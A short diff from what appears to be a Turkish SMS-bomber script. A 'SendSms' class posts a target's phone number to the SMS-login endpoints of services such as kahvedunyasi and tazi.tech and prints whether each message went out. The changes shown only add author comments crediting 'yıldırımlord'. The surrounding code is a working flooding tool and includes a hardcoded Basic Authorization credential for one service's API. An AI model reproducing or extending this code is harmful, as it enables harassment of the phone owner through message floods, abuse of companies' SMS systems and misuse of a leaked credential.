@@ -28,7 +28,7 @@ class SendSms():
             else:
                 raise
         except:    
-            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> core.kahvedunyasi.com")
+            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> core.kahvedunyasi.com")  #MADE BY YILDIRIMLORD
         
      
     #wmf.com.tr
@@ -132,7 +132,7 @@ class SendSms():
         try:
             url = "https://mobileapiv2.tazi.tech:443/C08467681C6844CFA6DA240D51C8AA8C/uyev2/smslogin"
             headers = {"Accept": "application/json, text/plain, */*", "Content-Type": "application/json;charset=utf-8", "Accept-Encoding": "gzip, deflate", "User-Agent": "Taz%C4%B1/3 CFNetwork/1335.0.3 Darwin/21.6.0", "Accept-Language": "tr-TR,tr;q=0.9", "Authorization": "Basic dGF6aV91c3Jfc3NsOjM5NTA3RjI4Qzk2MjRDQ0I4QjVBQTg2RUQxOUE4MDFD"}
-            json={"cep_tel": self.phone, "cep_tel_ulkekod": "90"}
+            json={"cep_tel": self.phone, "cep_tel_ulkekod": "90"} #made by yıldırımlord code
             r = requests.post(url, headers=headers, json=json, timeout=6)
             if (r.json()["kod"]) == "0000":
                 print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> mobileapiv2.tazi.tech")
